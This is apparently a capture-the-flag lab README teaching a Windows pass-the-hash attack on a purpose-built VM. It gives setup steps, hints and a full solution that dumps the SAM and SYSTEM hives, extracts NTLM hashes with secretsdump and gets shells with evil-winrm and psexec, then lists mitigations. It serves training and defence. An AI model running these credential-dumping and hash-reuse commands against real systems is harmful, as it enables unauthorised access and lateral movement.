# Challenge 3  Pass-the-Hash

**Difficulty:** Hard
**Category:** Windows Credential Abuse / Lateral Movement
**Flag:** `C:\CTF\stephen_quarters\orders.txt`

---

## Story

You are **Django**. You've broken into Candyland's network as a low-privileged user.
Stephen  Candie's head of operations, a local Administrator  holds the final orders
locking Broomhilda away.

You do not need Stephen's password.
In Windows, the hash *is* the password.

Extract his NTLM hash. Use it. Walk through the door.

---

## Setup

1. Start a **Windows VM** (Windows 10 Pro or Windows Server 2019/2022)
2. Run PowerShell as Administrator:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

3. Note your VM's IP address: `ipconfig`
4. Log in as `django` / `freedom`

### Tools required (on your attack machine  Kali or Mac)

```bash
pip install impacket
gem install evil-winrm
# Or: pip install crackmapexec
```

---

## Background: Pass-the-Hash (PtH)

NTLM authentication does not require the plaintext password. The protocol works like this:

```
1. Client  Server: "I want to authenticate as stephen"
2. Server  Client: [random challenge]
3. Client  Server: HMAC(NTLM_hash, challenge)    the hash IS the secret
4. Server: verifies the response
```

The NTLM hash of the password is sufficient to complete authentication.
If you extract it from the SAM database or from memory (lsass), you can authenticate
as that user  to WinRM, SMB, RDP (in some configurations), and more 
without ever knowing the plaintext password.

---

## Hints

<details>
<summary>Hint 1  Getting the hash</summary>
Use `reg save` to dump the SAM and SYSTEM hives as `django` (they can do this as a
standard user on some configs, or escalate first):

```cmd
reg save HKLM\SAM C:\Users\django\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\django\Desktop\SYSTEM
```

Transfer to Kali, then:
```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Find `stephen`'s NTLM hash in the output.
</details>

<details>
<summary>Hint 2  Using the hash</summary>
NTLM hashes are in the format `LM:NTLM`. You only need the NTLM part (32 hex chars after the colon).

With evil-winrm:
```bash
evil-winrm -i <VM_IP> -u stephen -H <NTLM_HASH>
```

With psexec.py (opens SYSTEM shell via SMB):
```bash
psexec.py stephen@<VM_IP> -hashes :<NTLM_HASH>
```
</details>

<details>
<summary>Hint 3</summary>
Once you have a shell as `stephen` (or SYSTEM via psexec), the flag is at:

```cmd
type C:\CTF\stephen_quarters\orders.txt
```
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Dump SAM and SYSTEM hives

From `django`'s cmd:
```cmd
reg save HKLM\SAM C:\Users\django\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\django\Desktop\SYSTEM
```

Transfer both files to Kali (use a Python HTTP server on the VM, or shared folder).

### Step 2  Extract hashes

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

```
stephen:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

The NTLM hash is: `8846f7eaee8fb117ad06bdd830b7586c`

### Step 3  Pass the hash with evil-winrm

```bash
evil-winrm -i <VM_IP> -u stephen -H 8846f7eaee8fb117ad06bdd830b7586c
```

You now have a shell as `stephen`.

### Step 3 (alternative)  Pass the hash with psexec

```bash
psexec.py stephen@<VM_IP> -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

Opens a SYSTEM shell via SMB.

### Step 4  Read the flag

```cmd
type C:\CTF\stephen_quarters\orders.txt
```

```
CTF{p4ss_th3_h4sh_n04m_dj4ng0_w1ns}
```

### Why this works

NTLM was designed before the principle of hash confidentiality was well understood.
Because the hash is derived deterministically from the password and used directly
in the challenge-response, possessing the hash is equivalent to possessing the password.
This cannot be fixed without replacing NTLM  which is why Microsoft has been deprecating
it in favor of Kerberos. Mitigations: disable NTLM where possible, enable Protected Users
security group, deploy Credential Guard, and enforce network segmentation to limit
lateral movement opportunities.

</details>
